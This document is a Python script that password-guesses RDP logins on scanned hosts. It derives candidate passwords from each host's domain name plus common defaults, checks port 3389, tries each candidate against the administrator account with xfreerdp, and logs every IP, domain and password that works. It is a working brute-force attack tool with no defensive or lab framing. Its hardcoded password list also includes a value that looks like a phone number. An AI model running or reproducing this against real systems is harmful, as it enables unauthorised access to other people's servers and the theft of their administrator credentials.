import json, glob, subprocess, socket, sys, time

# Build IP-password map from scan results
ip_pws = {}
for f in glob.glob('/tmp/scan_results/*.json'):
    d = json.load(open(f))
    name = d['domain'].split('.')[0]
    for ip in d.get('ips', []):
        if ip not in ip_pws:
            ip_pws[ip] = []
        ip_pws[ip].extend([name, name+'123', name+'888', name+'2024'])

common = ['100206', 'admin123', 'admin888', '123456', 'password', '13681449049']

hits = []
tested = 0

for ip in sorted(ip_pws.keys()):
    # Check RDP port open first
    try:
        s = socket.socket()
        s.settimeout(2)
        result = s.connect_ex((ip, 3389))
        s.close()
        if result != 0:
            continue
    except:
        continue
    
    pws = ip_pws[ip][:4] + common[:3]
    pws = list(dict.fromkeys(pws))  # dedupe
    
    for pw in pws:
        tested += 1
        try:
            r = subprocess.run(
                ['timeout', '8', 'xvfb-run', '-a', 'xfreerdp',
                 '/v:' + ip, '/u:administrator', '/p:' + pw,
                 '/cert-ignore', '/auth-only', '/sec:rdp'],
                capture_output=True, text=True, timeout=10)
        except:
            continue
        
        if 'exit status 0' in r.stdout + r.stderr:
            domain = 'unknown'
            for f in glob.glob('/tmp/scan_results/*.json'):
                d = json.load(open(f))
                if ip in d.get('ips', []):
                    domain = d['domain']
                    break
            msg = ip + ' (' + domain + ') admin/' + pw
            print(msg)
            hits.append((ip, domain, pw))
            break

print('Tested:', tested)
print('Hits:', len(hits))
